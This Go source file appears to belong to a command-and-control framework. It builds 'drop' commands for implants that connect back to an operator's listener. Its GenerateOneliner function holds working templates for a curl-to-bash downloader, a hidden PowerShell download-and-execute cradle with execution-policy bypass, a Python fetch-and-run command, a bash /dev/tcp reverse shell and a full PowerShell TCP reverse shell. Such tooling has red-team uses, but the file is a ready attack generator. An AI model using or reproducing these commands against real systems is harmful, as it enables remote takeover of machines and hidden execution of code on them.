package c2

import (
	"fmt"
	"strings"

	"kestrel/internal/database"
)

// OnelinerKind identifies the language/delivery mechanism of a one-liner drop command.
type OnelinerKind string

const (
	OnelinerBashHTTP       OnelinerKind = "bash_http"
	OnelinerPowerShellHTTP OnelinerKind = "powershell_http"
	OnelinerPythonHTTP     OnelinerKind = "python_http"
	OnelinerBashTCP        OnelinerKind = "bash_tcp"
	OnelinerPowerShellTCP  OnelinerKind = "powershell_tcp"
	OnelinerBashWS         OnelinerKind = "bash_ws"
	// OnelinerCurl is a convenience alias for bash_http that highlights the curl delivery method.
	OnelinerCurl OnelinerKind = "curl"
)

// AllOnelinerKinds returns every supported OnelinerKind.
func AllOnelinerKinds() []OnelinerKind {
	return []OnelinerKind{
		OnelinerBashHTTP,
		OnelinerPowerShellHTTP,
		OnelinerPythonHTTP,
		OnelinerBashTCP,
		OnelinerPowerShellTCP,
		OnelinerBashWS,
	}
}

// listenerTypeToKinds maps listener types to the set of compatible oneliner kinds.
var listenerTypeToKinds = map[string][]OnelinerKind{
	"http_beacon":  {OnelinerBashHTTP, OnelinerCurl, OnelinerPowerShellHTTP, OnelinerPythonHTTP},
	"https_beacon": {OnelinerBashHTTP, OnelinerCurl, OnelinerPowerShellHTTP, OnelinerPythonHTTP},
	"tcp_beacon":   {OnelinerBashTCP, OnelinerPowerShellTCP},
	"websocket":    {OnelinerBashWS},
}

// IsOnelinerCompatible reports whether the given oneliner kind works with the listener type.
func IsOnelinerCompatible(listenerType string, kind OnelinerKind) bool {
	for _, k := range OnelinerKindsForListener(listenerType) {
		if k == kind {
			return true
		}
	}
	return false
}

// OnelinerKindsForListener returns all oneliner kinds compatible with the given listener type.
func OnelinerKindsForListener(listenerType string) []OnelinerKind {
	if kinds, ok := listenerTypeToKinds[listenerType]; ok {
		return kinds
	}
	// Default: HTTP-based for unknown types
	return []OnelinerKind{OnelinerBashHTTP, OnelinerPowerShellHTTP}
}

// OnelinerInput holds the parameters needed to generate a one-liner drop command.
type OnelinerInput struct {
	Kind         OnelinerKind
	Host         string
	Port         int
	HTTPBaseURL  string
	ImplantToken string
}

// GenerateOneliner produces a one-liner shell/script command that downloads and
// executes a beacon payload.  It returns an error for invalid hosts or inputs.
func GenerateOneliner(input OnelinerInput) (string, error) {
	if err := ValidateBeaconDialHost(input.Host); err != nil {
		return "", fmt.Errorf("invalid host: %w", err)
	}
	if input.ImplantToken == "" {
		return "", fmt.Errorf("implant token is required")
	}
	if input.Port <= 0 || input.Port > 65535 {
		return "", fmt.Errorf("invalid port: %d", input.Port)
	}

	baseURL := strings.TrimRight(input.HTTPBaseURL, "/")
	downloadURL := fmt.Sprintf("%s/d/%s", baseURL, input.ImplantToken)

	switch input.Kind {
	case OnelinerBashHTTP, OnelinerCurl:
		return fmt.Sprintf(`curl -fsSL '%s' | bash`, downloadURL), nil

	case OnelinerPowerShellHTTP:
		return fmt.Sprintf(
			`powershell -NoP -NonI -W Hidden -Exec Bypass -C "iex(New-Object Net.WebClient).DownloadString('%s')"`,
			downloadURL,
		), nil

	case OnelinerPythonHTTP:
		return fmt.Sprintf(
			`python3 -c "import urllib.request,subprocess;subprocess.run(['bash'],input=urllib.request.urlopen('%s').read())"`,
			downloadURL,
		), nil

	case OnelinerBashTCP:
		return fmt.Sprintf(
			`bash -i >& /dev/tcp/%s/%d 0>&1`,
			input.Host, input.Port,
		), nil

	case OnelinerPowerShellTCP:
		return fmt.Sprintf(
			`powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$by=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"`,
			input.Host, input.Port,
		), nil

	case OnelinerBashWS:
		return fmt.Sprintf(`curl -fsSL '%s' | bash`, downloadURL), nil

	default:
		return "", fmt.Errorf("unsupported oneliner kind: %s", input.Kind)
	}
}

// ValidateOnelinerForListener performs additional validation of the oneliner
// kind against the specific listener configuration.
func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKind) error {
	if listener == nil {
		return fmt.Errorf("listener is nil")
	}
	if !IsOnelinerCompatible(listener.Type, kind) {
		return fmt.Errorf("oneliner kind %q is not compatible with listener type %q", kind, listener.Type)
	}
	return nil
}
